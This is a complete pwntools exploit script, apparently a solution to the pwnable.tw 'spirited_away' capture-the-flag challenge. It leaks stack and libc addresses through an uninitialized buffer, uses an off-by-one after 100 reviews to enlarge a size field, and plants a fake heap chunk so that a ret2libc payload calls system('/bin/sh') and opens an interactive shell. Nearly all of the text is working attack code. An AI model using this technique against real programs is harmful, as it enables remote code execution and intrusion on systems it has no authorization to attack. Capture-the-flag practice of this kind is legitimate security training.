#!/usr/bin/env python3

from pwn import *

exe = ELF("./spirited_away_patched")
libc = ELF("./libc_32.so.6", checksec = False)
ld = ELF("./ld-2.23.so", checksec = False)

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10204)

    return r


def review(name: bytes, age: int, reason: bytes, comment: bytes, ans = b"y", for_leak = False) -> list[bytes] | None:
    r.sendafter(b"enter your name: ", name)
    r.sendlineafter(b"enter your age: ", str(age).encode("ascii"))
    r.sendafter(b"see this movie? ", reason)
    r.sendafter(b"enter your comment: ", comment)
    
    if for_leak:
        output = [x.split(b": ")[1] for x in r.recvlines(4)]
        r.sendlineafter(b"<y/n>: ", ans)
        return output
    else:
        r.sendlineafter(b"<y/n>: ", ans)
        return None


def main():
    r = conn()

    # "reason" buffer is not initialized so we can leak stuff in it
    output = review(b"A", 1, b"A" * 0x50, b"A", for_leak = True)

    leaks = output[2].strip(b"A")
    ebp = u32(leaks[:4]) - 0x20
    libc.address = u32(leaks[8:12]) - libc.sym._IO_2_1_stdout_
    log.info(f"ebp @ 0x{ebp:x}")
    log.info(f"libc @ 0x{libc.address:x}")

    # Reach 100+ reviews to overflow by one to name_size and change it to 0x6e ('n')
    for _ in range(100):
        print(_)
        review(b"A", 1, b"A", b"A")

    # Create a fake chunk (remember that it must be aligned to 0x8 bytes in a 32-bit program)
    # Also, we place it in the "reason" buffer so we can control the next_size metadata, which
    # will be out-of-reach in case we would have placed the chunk slightly after
    fake_chunk = flat(
                    b"A" * 2,       # Padding
                    p32(0x0),       # Prev size
                    p32(0x41),      # Size
                    p32(0x41) * 17  # Padding + "Next chunk"'s prev_size
                )

    comment = flat(
                    b"A" * 0x50,        # Comment
                    p32(1),             # Age
                    p32(ebp - 0x40)     # Name pointer
                )

    review(b"A", 1, fake_chunk, comment)

    # Now we can simply inject our payload and enjoy the shell :)
    payload = flat(
                    b"A" * 0x40,
                    p32(ebp + 0x28),
                    p32(libc.sym.system),
                    p32(exe.sym.main),
                    p32(next(libc.search(b"/bin/sh\x00")))
                )

    review(payload, 1, b"A", b"A", ans = b"n")

    r.interactive("$ ")


if __name__ == "__main__":
    main()
